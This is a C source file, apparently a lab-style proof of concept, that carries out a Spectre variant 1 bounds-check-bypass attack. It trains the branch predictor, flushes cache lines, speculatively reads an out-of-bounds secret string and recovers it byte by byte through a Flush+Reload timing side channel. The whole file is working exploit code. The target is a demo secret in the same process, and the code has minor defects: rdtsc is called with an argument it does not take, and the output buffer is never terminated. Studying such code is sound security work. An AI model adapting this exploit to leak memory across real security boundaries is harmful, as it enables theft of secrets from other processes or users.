#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

#include <string.h>
#include <unistd.h>

//  Windows
#ifdef _WIN32
#include <intrin.h>
uint64_t rdtsc(){
    return __rdtsc();
}
//  Linux/GCC
#else
uint64_t rdtsc(){
    unsigned int lo,hi;
    __asm__ __volatile__ ("rdtsc" : "=a" (lo), "=d" (hi));
    return ((uint64_t)hi << 32) | lo;
}
#endif

#define CACHE_WORD_SIZE 2048

unsigned int bound_lower = 0;
unsigned int bound_upper = 9;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
char    *secret    = "Some Secret Value";   
uint8_t array[256*CACHE_WORD_SIZE];


#define CACHE_HIT_THRESHOLD (200)
#define DELTA 512

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
  if (x <= bound_upper && x >= bound_lower) {
     return buffer[x];
  } else {
     return 0;
  } 
}

void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*CACHE_WORD_SIZE + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*CACHE_WORD_SIZE +DELTA]);
}

void reloadSideChannel(char* sFound, int k)
{
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  for(i = 0; i < 256; i++){
    addr = &array[i*CACHE_WORD_SIZE + DELTA];
    time1 = rdtsc(&junk);
    junk = *addr;
    time2 = rdtsc(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD){
        printf("array[%d*2048 + %d] is in cache.\n", i, DELTA);
        printf("The Secret = %d(%c).\n",i, i);
	sFound[k] = i;
    }
  } 
}
void spectreAttack(size_t index_beyond)
{
  int i;
  uint8_t s;
  volatile int z;
  // Train the CPU to take the true branch inside restrictedAccess().
  for (i = 0; i < 10; i++) { 
      restrictedAccess(i); 
  }
  // Flush bound_upper, bound_lower, and array[] from the cache.
  _mm_clflush(&bound_upper);
  _mm_clflush(&bound_lower);
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*CACHE_WORD_SIZE + DELTA]); }
  for (z = 0; z < 100; z++)  {   }
  // Ask restrictedAccess() to return the secret in out-of-order execution. 
  s = restrictedAccess(index_beyond);  
  array[s*CACHE_WORD_SIZE + DELTA] += 88;  
}

int main() {

	int k = 0;
	char secretFound[strlen(secret)];
	int e=0; // initialization of the array
	for(e=0; e<strlen(secret);e++){
		secretFound[e] = '.';//initialize all elements as point
	}

	for(k=0; k < strlen(secret); k++){

	  flushSideChannel();
	  
	  size_t index_beyond = (size_t)(secret - (char*)buffer + k ) ;  

	  printf("secret: %p \n", secret);
	  printf("buffer: %p \n", buffer);
	  printf("index of secret (out of bound): %ld \n", index_beyond);
	  spectreAttack(index_beyond);
	  reloadSideChannel(secretFound, k);
	  
	  usleep(70000);
	}
	printf("The secret is: %s\n\n", secretFound);
	return (0);
}
